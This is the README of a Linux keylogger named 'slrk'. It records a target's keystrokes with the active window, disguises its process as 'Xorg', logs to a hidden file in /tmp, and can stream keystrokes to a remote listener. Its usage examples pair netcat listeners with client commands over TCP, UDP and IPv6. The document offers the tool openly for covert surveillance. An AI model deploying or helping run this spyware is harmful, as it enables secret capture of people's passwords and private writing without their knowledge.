# Simple_Local&Remote_Keylogger

##DESCRIPTION

- Simple keylogger that runs on Linux either locally or remotely.
- It shows the active window on which the target is writing.
- Keys are mapped on US keyboard.
- It shows the keyboard layout(e.g.: us, it, colemak, etc..).
- Process name is renamed as "Xorg".
- It works with both TCP and UDP and with ipv6 too.
- It must be run as root.

##USAGE:
```
#./slrk [OPTIONS]
```
##OPTIONS
```
-d <input-device>:			If not specified, the default device is '/dev/input/by-path/***kbd'
-o <output-file>:			It can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt'
-m remote -a <IP-ADDR> -p <PORT>:	It sends all the keystrokes on the remote server located at <IP-ADDR:PORT>
```
##EXAMPLE

[TCP]
```
Server$ nc -lvp 8888 > logger.txt
Client#./slrk -m remote -a 127.0.0.1 -p 8888
```
[UDP]
```
Server$ nc -u -lvp 8888 > logger.txt
Client#./slrk -m remote -a 127.0.0.1 -p 8888
```
[IPv6]
```
Server$ nc -6 -lvp 8888 > logger.txt
Client#./slrk -m remote -a ::1 -p 8888
```	
